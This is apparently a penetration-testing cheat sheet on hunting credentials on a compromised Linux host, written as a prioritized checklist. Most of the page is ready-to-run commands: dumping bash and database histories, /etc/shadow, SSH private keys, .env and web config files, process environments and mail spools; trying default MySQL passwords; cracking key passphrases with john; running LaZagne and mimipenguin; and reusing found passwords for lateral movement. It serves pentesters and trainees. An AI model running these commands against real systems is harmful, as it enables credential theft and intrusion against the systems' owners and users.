---
title: 'Credential Hunting'
description: 'Linux credential hunting techniques — config files, web roots, SSH keys, bash history, database files, mail spools, password reuse, and automated credential extraction.'
---

# Credential Hunting

## Priority Checklist

Check these in order for quickest wins:

| # | Location | Command |
|:--|:---------|:--------|
| 1 | Bash history (all users) | `cat ~/.bash_history` + `find /home -name ".bash_history" -exec cat {} \; 2>/dev/null` |
| 2 | SSH private keys | `find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null` |
| 3 | Web app config files | `find /var/www -name "*.config" -o -name "*.conf" -o -name "*.php" 2>/dev/null` |
| 4 | WordPress DB creds | `grep -i 'DB_USER\|DB_PASSWORD' /var/www/*/wp-config.php 2>/dev/null` |
| 5 | .env files (Laravel, Node, etc.) | `find / -name ".env" -type f 2>/dev/null` |
| 6 | /etc/shadow (if readable) | `cat /etc/shadow 2>/dev/null` |
| 7 | Mail / spool directories | `find /var/mail /var/spool/mail -readable 2>/dev/null` |
| 8 | Database history files | `cat ~/.mysql_history ~/.psql_history 2>/dev/null` |
| 9 | Config files with "password" | `grep -ri "password" /etc/ /opt/ /var/www/ 2>/dev/null` |
| 10 | Credential files in /tmp, /opt, /var | `find /tmp /opt /var -name "*.txt" -o -name "*.log" -o -name "*.bak" 2>/dev/null` |

!!! tip "Password Reuse"
    Any credential you find — try it for ALL users on the system and for ALL services (SSH, database, web apps). Password reuse is extremely common and is often the path to root.

---

## 1. Web Application Credentials

### WordPress

```bash
# WordPress DB credentials (most common find)
find / -name "wp-config.php" -exec grep -i "DB_USER\|DB_PASSWORD\|DB_HOST\|DB_NAME" {} \; 2>/dev/null
```

### Laravel / PHP Apps

```bash
# .env files (Laravel, Symfony, etc.)
find / -name ".env" -type f -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# Look for: DB_PASSWORD, APP_KEY, MAIL_PASSWORD, AWS_SECRET
```

### Other Web Apps

```bash
# General web root search
find /var/www -type f \( -name "*.php" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" \) -exec grep -li "password\|passwd\|pass\|pwd\|secret\|key\|token" {} \; 2>/dev/null

# Tomcat credentials
cat /opt/tomcat/conf/tomcat-users.xml 2>/dev/null
cat /etc/tomcat*/tomcat-users.xml 2>/dev/null

# Node.js configs
find / -name "config.js" -o -name "config.json" -o -name ".env" 2>/dev/null | grep -v node_modules
```

#### Common Web Config Credential Locations

| Application | File | Credential Fields |
|:------------|:-----|:-----------------|
| WordPress | `wp-config.php` | `DB_USER`, `DB_PASSWORD` |
| Laravel | `.env` | `DB_PASSWORD`, `APP_KEY`, `MAIL_PASSWORD` |
| Tomcat | `tomcat-users.xml` | `username`, `password` attributes |
| Joomla | `configuration.php` | `$user`, `$password` |
| Drupal | `settings.php` | `$databases['default']` |
| Django | `settings.py` | `DATABASES`, `SECRET_KEY` |
| Node.js | `.env` / `config.json` | Various |
| Gitea | `app.ini` | `PASSWD` in `[database]` section |
| phpMyAdmin | `config.inc.php` | `$cfg['Servers'][$i]['password']` |

---

## 2. SSH Keys

### Finding SSH Keys

```bash
# Private keys (instant lateral movement or escalation)
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null

# Check all users' .ssh directories
ls -la /home/*/.ssh/ 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null

# Authorized keys (see who can log in)
find / -name "authorized_keys" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# Known hosts (reveals other systems the user connected to)
find / -name "known_hosts" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null
```

!!! tip "SSH Key Exploitation"
    1. Found a private key? → Try it against **all users** on the current box and against hosts in `known_hosts`
    2. Found `authorized_keys`? → Shows which public keys are trusted (map to other compromised hosts)
    3. Key has a passphrase? → Crack it with `ssh2john id_rsa > hash.txt && john hash.txt --wordlist=rockyou.txt`

### Using Found Keys

```bash
# Set correct permissions and connect
chmod 600 id_rsa
ssh -i id_rsa user@target

# Try the key for root
ssh -i id_rsa root@localhost
ssh -i id_rsa root@$(hostname)
```

---

## 3. History & Log Files

### Bash History

```bash
# Current user
cat ~/.bash_history

# All users (if readable)
find /home -name ".bash_history" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# Root history
cat /root/.bash_history 2>/dev/null

# Search for passwords in all history files
grep -hi "pass\|pwd\|secret\|token\|key\|mysql\|ssh\|ftp" /home/*/.bash_history 2>/dev/null
```

### Database History

```bash
# MySQL command history (may have cleartext passwords)
cat ~/.mysql_history 2>/dev/null
find /home -name ".mysql_history" -exec cat {} \; 2>/dev/null

# PostgreSQL history
cat ~/.psql_history 2>/dev/null
```

### Application Logs

```bash
# Search logs for credentials
grep -ri "password\|passwd\|pass\|credentials" /var/log/ 2>/dev/null | head -50

# Apache/Nginx access logs (GET parameters with passwords)
grep -i "pass\|user\|login" /var/log/apache2/access.log* 2>/dev/null
grep -i "pass\|user\|login" /var/log/nginx/access.log* 2>/dev/null

# Auth logs (failed logins sometimes contain passwords typed as usernames)
cat /var/log/auth.log 2>/dev/null | grep -i "failed\|invalid"
```

---

## 4. Configuration File Hunting

### Broad Search

```bash
# Find all config files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# Config files by extension
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cnf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" -o -name "*.yaml" -o -name "*.yml" \) 2>/dev/null | grep -v "proc\|sys\|lib\|share"

# Search inside config files for passwords
grep -rli "password\|passwd\|pass\|pwd" /etc/ /opt/ /var/ /home/ 2>/dev/null | grep -v "proc\|sys\|lib\|share\|doc\|man"
```

### High-Value Files to Check

| File / Path | What to Look For |
|:------------|:----------------|
| `/etc/shadow` | Password hashes (need root or shadow group) |
| `/etc/samba/smb.conf` | Share configs, guest access, passwords |
| `/etc/mysql/my.cnf` or `~/.my.cnf` | MySQL credentials |
| `/etc/postgresql/*/pg_hba.conf` | PostgreSQL auth config |
| `/etc/openldap/ldap.conf` | LDAP bind credentials |
| `/etc/openvpn/*.conf` | VPN credentials |
| `/etc/freeradius/*/clients.conf` | RADIUS shared secrets |
| `/etc/ppp/chap-secrets` | PPP/VPN credentials |
| `/etc/inetd.conf` | Legacy service configs |
| `/etc/exports` | NFS shares (potential for root_squash bypass) |

### Backup Files

```bash
# Backup files often contain old configs with passwords
find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*~" -o -name "*.save" -o -name "*.orig" \) 2>/dev/null | grep -v "proc\|sys"

# Specifically look for shadow/passwd backups
find / -name "shadow*" -o -name "passwd*" 2>/dev/null | grep -v proc
```

!!! warning "Shadow File Backups"
    Admins sometimes create backups like `shadow.bak` or `passwd.old` with world-readable permissions. These contain crackable password hashes.

---

## 5. Database Credentials

### Direct Database Access

```bash
# MySQL — try passwordless root login
mysql -u root -e "SELECT User, Host FROM mysql.user;" 2>/dev/null

# MySQL — common default credentials
mysql -u root -p'root' -e "show databases;" 2>/dev/null
mysql -u root -p'toor' -e "show databases;" 2>/dev/null
mysql -u root -p'' -e "show databases;" 2>/dev/null

# PostgreSQL
psql -U postgres -c "\l" 2>/dev/null

# SQLite databases
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
```

### Database Config Files

```bash
# MySQL config (may have password)
cat /etc/mysql/my.cnf 2>/dev/null
cat /etc/mysql/debian.cnf 2>/dev/null     # Debian maintenance password!
cat ~/.my.cnf 2>/dev/null                  # Per-user MySQL config

# PostgreSQL
cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null
```

!!! tip "Debian MySQL Maintenance Password"
    On Debian/Ubuntu systems, `/etc/mysql/debian.cnf` often contains the `debian-sys-maint` user password. This user typically has full MySQL privileges.

---

## 6. Mail & Spool

```bash
# Mail directories
ls -la /var/mail/ 2>/dev/null
ls -la /var/spool/mail/ 2>/dev/null

# Read mail for current user
cat /var/mail/$(whoami) 2>/dev/null
cat /var/spool/mail/$(whoami) 2>/dev/null

# Check all readable mailboxes
find /var/mail /var/spool/mail -readable -exec echo "=== {} ===" \; -exec head -100 {} \; 2>/dev/null

# Mbox files
find / -name "*.mbox" -o -name "mbox" 2>/dev/null
```

**What to look for**: password reset emails, automated system notifications with credentials, service account setup emails.

---

## 7. Credential Files in Common Locations

```bash
# Files with "password" in the name
find / -type f -iname "*password*" 2>/dev/null | grep -v "proc\|sys\|lib\|share"
find / -type f -iname "*credential*" 2>/dev/null | grep -v "proc\|sys\|lib\|share"
find / -type f -iname "*secret*" 2>/dev/null | grep -v "proc\|sys\|lib\|share"

# Hidden files in /opt, /var, /tmp (common for deployed apps)
find /opt /var /tmp -name ".*" -type f -exec ls -la {} \; 2>/dev/null

# Git repositories (may have committed credentials)
find / -name ".git" -type d 2>/dev/null
# Then check git log for sensitive commits:
# cd /path/to/repo && git log --all --oneline
# git log --all --diff-filter=D -- "*.conf" "*.env" "*password*"
# git show COMMIT_HASH
```

!!! tip "Git Credential Hunting"
    Developers frequently commit credentials to git then remove them later. Use `git log -p` to see full diffs of every commit — deleted credentials are still in the history.

    ```bash
    # Search all git history for passwords
    git log --all -p | grep -i "password\|passwd\|secret\|token\|key" | head -50
    ```

---

## 8. Automated Credential Extraction

### LaZagne (Linux)

Extracts credentials stored by applications automatically.

```bash
# Download and run
python3 laZagne.py all

# Specific modules
python3 laZagne.py browsers
python3 laZagne.py sysadmin
python3 laZagne.py databases
```

**Repo**: [github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)

### mimipenguin

Extracts cleartext credentials from memory on Linux (like mimikatz for Linux).

```bash
# Requires root
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh
```

**Repo**: [github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin)

!!! warning "mimipenguin Requires Root"
    mimipenguin needs root access to read process memory. Useful after initial escalation to harvest additional credentials for lateral movement.

---

## 9. Quick One-Liner Reference

```bash
# Everything in one shot — broad credential search
grep -rli "password\|passwd\|pass\|pwd\|secret\|token\|apikey\|api_key" /etc/ /opt/ /var/www/ /home/ /root/ /tmp/ 2>/dev/null | sort -u

# Find readable files owned by other users (potential misconfigs)
find / -readable -not -user $(whoami) -type f \( -name "*.conf" -o -name "*.config" -o -name "*.env" -o -name "*.php" -o -name "*.py" -o -name "*.sh" \) 2>/dev/null | grep -v "proc\|sys\|lib\|share"

# Search /proc for passwords in running process environments
find /proc -name environ -exec cat {} \; 2>/dev/null | tr "\0" "\n" | grep -i "pass\|pwd\|secret\|token"

# Check for password-less sudo/su
echo "" | sudo -S id 2>/dev/null
su - root -c id 2>/dev/null
```
